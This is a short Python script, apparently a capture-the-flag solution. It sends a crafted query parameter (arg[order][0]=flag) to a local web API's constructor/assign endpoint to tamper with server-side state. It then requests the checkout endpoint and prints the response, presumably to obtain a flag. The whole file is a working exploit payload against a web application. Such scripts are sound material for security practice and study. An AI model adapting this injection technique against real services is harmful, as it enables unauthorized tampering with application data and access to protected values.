import requests

s  = requests.session()
url = "http://localhost:33335"
payload = '/api/constructor/assign?arg[order][0]=flag'
s.get(url + payload)
print(s.get(url+'/api/user/checkout').text)